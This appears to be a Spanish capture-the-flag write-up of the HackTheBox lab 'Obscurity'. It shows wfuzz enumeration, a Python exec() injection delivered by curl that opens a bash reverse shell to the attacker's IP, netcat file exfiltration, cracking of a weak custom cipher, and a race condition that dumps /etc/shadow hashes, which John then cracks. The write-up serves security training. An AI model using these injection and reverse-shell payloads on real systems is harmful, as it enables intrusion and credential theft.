# 10.10.10.168 - Obscurity
![Obscurity](https://user-images.githubusercontent.com/96772264/210838459-b399ceed-41cc-4ba7-aa83-e1d5b8c5c35e.png)

--------------------------

# Part 1: Enumeración

Puertos abiertos 22(ssh) y 8080(http) 
En el puerto 8080 nos topamos con una web relativamente simple:
![obscrity1](https://user-images.githubusercontent.com/96772264/210838483-c6833d11-ae40-438f-91e7-7c17cf35a98a.PNG)

```
0bscura
Aquí en Obscura tenemos un acercamiento unico a la seguridad. No puedes ser hackeado si los atacantes no saben
que tipo de software utilizas, nuestro lema es "Seguirdad por Oscuridad".
Escribimos nuestro propio software desde cero hasta el servidor web. 

Nuestro software personal incluye:
- Un servidor web 70% propio
- Estamos resolviendo errores menores de estabilidad, el servidor se reinicia si se cuelga mas de 30 segundos.
- Un algoritmo 85% inbatible
- Un sutituto mas seguro que ssh.

Contacto:
obscure.htb
secure@obscure.htb

Desarrollo del servidor -> el codigo fuente de la web está en 'SuperSecureServer.py' en el directorio secreto de
desarollo.
```
En el codigo fuente no encontramos más.
Si pongo en el /etc/hosts obscure.htb pero sale lo mismo
```console
└─$ diff <(curl -s http://10.10.10.168:8080) <(curl -s http://obscure.htb:8080)
# nada
```
Como no hay botones queda hacer fuzzing.

```console
# Fuzzing de subdirectorios
└─$ wfuzz -c --hw=367 -w $(locate subdomains-top1million-5000.txt) -H "Host: FUZZ.obscure.htb:8080" -u http://obscure.htb:8080/ -t 100
# Nada

# Fuzzing de subdominios
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://obscure.htb:8080/FUZZ/

# Fuzzing por php
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://obscure.htb:8080/FUZZ.php
# Nada
```

Cada pocas busquedas se cuelga esto, como habla de directorio "dev"....
```console
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
000004521:   200        170 L    498 W      5892 Ch     "develop"
```
-----------------------------
# Part 2: Framwork custom

En /develop/SuperSecureServer.py podemos obtener el codigo fuente de la web
Si tenemos un codigo antes de analizarlo es mejor buscar funciones peligrosas, que es realmente lo que interesa
entre todo
```console
└─$ cat SuperSecureServer.py | grep -niE "exec|os\.|system"
130:            exec(info.format(path)) # This is how you do string formatting, right?
```
Esa linea reside en esta función:

```python
def serveDoc(self, path, docRoot):
    path = urllib.parse.unquote(path)
    try:
        info = "output = 'Document: {}'" # Keep the output for later debug
        exec(info.format(path)) # This is how you do string formatting, right?
```
```console
└─$ python3
>>> import urllib

>>> path = "http://10.10.10.168:8080/index.html"
>>> info = "output = 'Document: {}'"
>>> info.format(path)
"output = 'Document: http://10.10.10.168:8080/index.html'"

>>> path = "http://10.10.10.168:8080/index.html; whoami"
>>> info.format(path) # -> "output = 'Document: http://10.10.10.168:8080/index.html; os.system('whoami')'"
>>> exec(info.format(path))
# Como no hemos cerrado la comilla ('...index.html; os.system('whoami')') se toma todo como parte de la url.

>>> path = "http://10.10.10.168:8080/index.html'; os.system('whoami');'"
>>> info.format(path) # "output = 'Document: http://10.10.10.168:8080/index.html';os.system('whoami');''"
>>> exec(info.format(path))
cucuxii
# La ";" sirve para dividir lineas en python por tanto:
#linea = 'url'; linea = os.system; linea = '' (cerrar la comilla inicial  'Document: http...) 
# "[  'url(...)';  ] + [  os system('whoami');  ] + [  ''  ]"
# '"http://obscure.htb:8080/';os.system('ping -c 1 10.10.14.16');'"
```
Por tanto podríamos tener ejecución remota de comandos. 

```console
└─$ curl -s "http://obscure.htb:8080/';os.system('ping -c 1 10.10.14.16');'" # Nada
└─$ curl -s "http://obscure.htb:8080/';os.system('ping%20-c%201%2010.10.14.16');'"
# ping -c 1 10.10.14.16. El %20 es un queivalente a espacio, como se pasa a urllib.parse.unquote se desurlencodea

└─$ curl -s "http://obscure.htb:8080/';os.system('bash%20-c%20\'bash%20-i%20>%26%20/dev/tcp/10.10.14.16/443%200>%261\'');'"  
#bash -c 'bash -i >%26 /dev/tcp/10.10.14.8/443 0>%261'  
```
-------------------------------
# Part 3: Script custom de encriptado

Por netcat entramos en el sistema como www-data. Antes de hacer mas enumeración en la carpeta home del usaurio robert encontramos cosas curiosas:
```console
www-data@obscure:/home/robert$ ls
BetterSSH  out.txt		SuperSecureCrypt.py
check.txt  passwordreminder.txt  user.txt
www-data@obscure:/home/robert$ cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct!
```

El script encripta y desencripta, para desencriptar nos pide un archivo y una llave para sacar en otro (resultado) out.txt y passwordreminder.txt son bytes 
sin sentido. Paso todo a mi sistema porque si le haces cat a una cadena cifrada se puede quedar colgado el sistema

```console
www-data@obscure:/home/robert$ nc 10.10.14.16 6666 < out.txt
www-data@obscure:/home/robert$ nc 10.10.14.16 6666 < check.txt
www-data@obscure:/home/robert$ nc 10.10.14.16 6666 < SuperSecureCrypt.py
www-data@obscure:/home/robert$ nc 10.10.14.16 6666 < passwordreminder.txt
```
Si tenemos dos cosas (encriptado y llave) para sacar una tercera (desencriptado), como en el enciprtado XOR. Podemos hacer que esas dos cosas sean encriptado
y desencriptado para sacar la llave sin necesidad de saberlas minucias del algoritmo que ha utilizado.
```console
└─$ python3 SuperSecureCrypt.py -i out.txt -k 'Encrypting this file with your key should result in out.txt, make sure your key is correct!' -d -o ./contraseña.txt
└─$ cat ./contraseña.txt
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich

└─$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k 'alexandrovich' -o ./robert.txt -d  
└─$ cat robert.txt
SecThruObsFTW

www-data@obscure:/home/robert$ su robert
Password: SecThruObsFTW
robert@obscure:~$ 
```

------------------------------
# Part 4: Escalada de privilegios

Nuesto usuario robert pertenece al grupo adm, es similar al sudoers, en sentido que puede ejecutar en nombre de un administrador determinadas cosas, en este caso:
```
(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```
Lo mas sencillo seria secuestrar el script añadiendo alguna linea que nos interese, pero no tiene permiso de escritura. El script es tal que así:

```python
import sys, os, time, crypt, traceback, subprocess
import random, string

path = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) # Cadena random de 8 Ej d1Q3v3xK
session = {"user": "", "authenticated": 0}
session['user'] = input("Enter username: ")
passW = input("Enter password: ")
with open('/etc/shadow', 'r') as f: # Linea con la contraseña haseada ej robert:$y$ABC.$
    data = f.readlines()
data = [(p.split(":") if "$" in p else None) for p in data] # Fragmentos del /etc/shadow -> ['robert','$y$ABC.$def','']
passwords = []
for x in data:
    if not x == None:
        passwords.append(x) # En passwords están todos los fragmentos del shadow que ha sacado

passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
with open('/tmp/SSH/'+path, 'w') as f: # En /tmp/SSH/d1Q3v3xK mete los fragmentos del shadow separados por salto de linea
    f.write(passwordFile)
time.sleep(.1) # Espera un micro segundo
salt, realPass = "", ""
for p in passwords:
    if p[0] == session['user']:
       salt, realPass = p[1].split('$')[2:] # divide la contraseña entre salt y pass (sus partes)
       break
if salt == "": # Si no hay salt
    print("Invalid user")
    os.remove('/tmp/SSH/'+path) # Elimina este archivo de contraseñas
    sys.exit(0)
salt = '$6$'+salt+'$'
realPass = salt + realPass
hash = crypt.crypt(passW, salt)
if hash == realPass:  # De dar una contraseña correcta nos autenticamos
   print("Authed!"); session['authenticated'] = 1
else:
   print("Incorrect pass"); os.remove('/tmp/SSH/'+path); sys.exit(0) # Si estaba mal al auth borra el archivo
   os.remove(os.path.join('/tmp/SSH/',path))   # Aunque este bien lo borra de todos modos

if session['authenticated'] == 1: # Se implementa este falso SSH
    while True:
        command = input(session['user'] + "@Obscure$ ") # Shell robert@Obscure$
        cmd = ['sudo', '-u',  session['user']] # 
        cmd.extend(command.split(" ")) # sudo -u robert + comando
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
```
Durante muy poco tiempo bajo /tmp/SSH (si existe) se crea una carpeta random donde estan las contraseñas del /etc/shadow temporalmente. Luego se borra este archivo.
Si intentamos leerlo de manera normal no podremos por el poco tiempo que está, asi que esto se soluciona con un bucle while true a velocidad informática.

```console
# ----- Terminal 1 -----
robert@obscure:/tmp/$ mkdir SSH; cd SSH # si no creamos esta carpeta da error el script
robert@obscure:/tmp/SSH$ while true; do cat * 2>/dev/null; done

# ----- Terminal 2 -----
robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: SecThruObsFTW
Authed!

# ----- Terminal 1 -----
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7

robert
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
18163
0
99999
7
```

```console
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
mercedes         (?)
robert@obscure:~/BetterSSH$ su root
Password: mercedes
root@obscure:/home/robert/BetterSSH# 
```
------------------------
# Extra: El script de encriptado

```python
└─$ /bin/cat SuperSecureCrypt.py 
import sys, argparse

# Estas dos funciones son casi iguales
def encrypt(text, key):								| def decrypt(text, key):
    keylen = len(key)								| 	keylen = len(key) 
    keyPos = 0										| 	keyPos = 0
    encrypted = ""									| 	decrypted = ""
    for x in text:									| 	for x in text:
        keyChr = key[keyPos]						|  	  keyChr = key[keyPos]
        newChr = ord(x)								|	  newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)  | 	  newChr = chr((newChr - ord(keyChr)) % 255)
        encrypted += newChr							|	  decrypted += newChr
        keyPos += 1									|	  keyPos += 1
        keyPos = keyPos % keylen					|	  keyPos = keyPos % keylen
    return encrypted								| 	return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')
parser.add_argument('-i', metavar='InFile', type=str, help='The file to read', required=False)
parser.add_argument('-o', metavar='OutFile', type=str, help='Where to output the encrypted/decrypted file')
parser.add_argument('-k', metavar='Key', type=str, help='Key to use', required=False)
parser.add_argument('-d', action='store_true', help='Decrypt mode')
args = parser.parse_args()

banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner += "  #        FILE MODE         #\n"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print(f"Opening file {args.i}...")
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()   # Abre el archivo "InFile" y lo llama data
        print("Decrypting...")
        decrypted = decrypt(data, args.k)  # Le pasa a decrypt el archivo (data) y la key
        print(f"Writing to {args.o}...")
        with open(args.o, 'w', encoding='UTF-8') as f: # En outfile mete el resultado de decrypt
            f.write(decrypted)
    else:
        print(f"Opening file {args.i}...")
        with open(args.i, 'r', encoding='UTF-8') as f: # Igual, abre el archivo "InFile" y lo llama data
            data = f.read()
        print("Encrypting...")
        encrypted = encrypt(data, args.k) # Lo encripta con la key
        print(f"Writing to {args.o}...")
        with open(args.o, 'w', encoding='UTF-8') as f: # En outfile mete el resultado de encrypt
            f.write(encrypted)
```
El algoritmo sería tal que ási...

```console
>>> texto = "H"
>>> llave = "t"
>>> ord("H") # 72
>>> ord("t") # 116
>>> chr(72)  # 'H' 

# Encriptado
>>> chr((72 + 116) % 255) # '¼' ->  ord = 188
>>> chr(72 + 116) # '¼' lo mismo

# Desenciptado
>>> chr((188 - 116) % 255) # 'H'
>>> chr(188 - 116) # 'H'
```

Por tanto se podria simplificar en un script como:

```python
with open('./out.txt', 'r', encoding='UTF-8') as archivo:
    texto = archivo.read()

keylen = len(llave)
keyPos = 0
desencriptado = ""
for x in texto:
    newChr = chr(ord(x) - ord(llave[keyPos]))
    desencriptado += newChr
    keyPos += 1
    keyPos = keyPos % keylen
print(desencriptado)
```
O simplificar mas aún:
```
>>> llave = "Encrypting this file with your key should result in out.txt, make sure your key is correct!"
>>> with open('./out.txt', 'r', encoding='UTF-8') as archivo:
...     texto = archivo.read()
...
>>> ''.join([ chr(ord(a) - ord(b)) for a,b in zip(texto,llave)])
'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich'
```
Zip empareja los elementos equivalentes en posición de cada lista
\[Hola y test\] en (H,t)  (o,e)  (l,s) y (a,t) 
Y les asignamos a y b a cada iteracion a la que se el aplica la operacion antes del for: chr(ord(a) - ord(b)))

